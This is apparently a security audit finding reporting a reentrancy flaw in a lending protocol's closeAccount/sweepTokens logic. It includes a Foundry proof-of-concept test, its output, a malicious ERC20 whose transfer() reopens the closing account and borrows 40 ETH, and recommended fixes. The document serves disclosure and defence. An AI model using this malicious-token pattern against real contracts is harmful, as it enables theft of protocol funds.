devtooligan
# Account.sweepTokens vulnerable to reentrancy - HIGH

## Summary
The protocol is vulnerable to a re-entrancy attack when closing an account.

## Vulnerability Detail
When an account is being closed, the current logic:
1.  Checks that the account is debt free and hasn't been opened in this block.
2. Deactivates the account and remove it from the `ownerFor` registry.  
3. Add the account to the list of `inactiveAccountsFor` the user.  
4. Finally, `account.sweepTokens()` is called which iterates through all of the tokens held by the account and returns them to the user.

If a malicious token were to enter the system, calling `transfer()` during the loop in `sweepTokens` could trigger a re-entrancy attack.

An example of such attack would be to have the attacker (assume account owner is a smart contract) call `AccountManager.openAccount()`. Since the open account logic recycles any inactive accounts, the account which is in the middle of being closed would now be re-opened and the remaining tokens which had not yet been swept would be considered collateral by the protocol.  Next the attacker could call `AccountManager.borrow` to initiate a leveraged position on what will soon become zero assets.

## Code Snippet
<details>
  <summary>POC attack script
</summary>

```solidity
    function testSweepReentrancy() public {
        setUpReentrancyAttack();  // add liquidity and attacker deposits 10e18 erc20 and 2e18 shady token

        // current balances
        console.log("balances before closing account and executing reentrancy attack");
        console.log("riskEngine.getBalance (in ETH)", riskEngine.getBalance(account) / 1e18);
        console.log("riskEngine.getBorrows (in ETH)", riskEngine.getBorrows(account) / 1e18);


        // attacker
        cheats.prank(attacker);
        accountManager.closeAccount(account);

        console.log("balances before after attack");
        console.log("riskEngine.getBalance (in ETH)", riskEngine.getBalance(account) / 1e18);
        console.log("riskEngine.getBorrows (in ETH)", riskEngine.getBorrows(account) / 1e18);
    }

```

</details>

<details>
  <summary>POC attack output
</summary>

```bash
[PASS] testSweepReentrancy() (gas: 743023)
Logs:
  balances before closing account and executing reentrancy attack
  riskEngine.getBalance (in ETH) 12
  riskEngine.getBorrows (in ETH) 0

  closing account 0x3E57De8dd768cf75D702Ee7B834B396982c8b946

  ShadyERC20.transfer
  reentered - opened account 0x3E57De8dd768cf75D702Ee7B834B396982c8b946
  reentered - initiating borrow

  balances after attack
  riskEngine.getBalance (in ETH) 0
  riskEngine.getBorrows (in ETH) 40

Test result: ok. 1 passed; 0 failed; finished in 3.74ms
```
</details>

<details>
  <summary>ShadyERC20 token example
</summary>

```
contract ShadyERC20 is ERC20, Test {
    address public admin;
    IAccountManager public accountManager;
    IRegistry public registry;
    IAttacker public attacker;

    constructor(
        string memory _name,
        string memory _symbol,
        uint8 _decimals,
        IAccountManager accountManager_,
        IRegistry registry_,
        IAttacker attacker_
    ) ERC20(_name, _symbol, _decimals) {
        admin = msg.sender;
        accountManager = accountManager_;
        registry = registry_;
        attacker = attacker_;
    }

    function transfer(
        address to,
        uint256 amount
    ) public returns (bool) {
        console.log("ShadyERC20.transfer");

        attacker.openAccount(accountOwner);

        address[] memory accounts = registry.accountsOwnedBy(accountOwner);
        address account = accounts[accounts.length - 1];
        console.log("reentered - opened account", account);
        address[] memory assets = IAccount(account).getAssets();
        assert(assets.length > 0);

        // initiate borrow
        console.log("reentered - initiating borrow");
        vm.prank(accountOwner);
        attacker.executeBorrow(account, 40e18);

        return true;
    }

}

```

</details>

## Tool used

Foundry
Manual Review

## Recommendation
Due to the complexity of the protocol, it is difficult to determine all of the possible reentrancy attack vectors which may exist using with any number of combinations of function calls.  As such, it is recommended to use a [reentrancy guard](https://github.com/transmissions11/solmate/blob/main/src/utils/ReentrancyGuard.sol) on all state mutating, external functions in `AccountManager`.

Alternatively, if a less effective mitigation was desired, a reentrancy guard on the `AccountManager.openAccount()` would prevent a category of attacks described in the POC above.

If the desire is to simply mitigate the exact attack in the above POC, then the order of function calls within `closeAccount` could be changed so that the `inactiveAccountsFor` array was appended to AFTER the tokens were swept.  NOTE: This breaks the checks-effects-interactions pattern and should be loudly noted if this approach is taken.  However, in this case it is deemed not to be a risk since it would simply delay updating the pool of inactive accounts to be recycled from.  

<details>
  <summary>
`AccountManager.openAccount()`
</summary>

```diff
@@ -117,8 +121,8 @@
         if (!account.hasNoDebt()) revert Errors.OutstandingDebt();
         account.deactivate();
         registry.closeAccount(_account);
-        inactiveAccountsOf[msg.sender].push(_account);
         account.sweepTo(msg.sender);
+        inactiveAccountsOf[msg.sender].push(_account);
         emit AccountClosed(_account, msg.sender);
     }
```

</details>
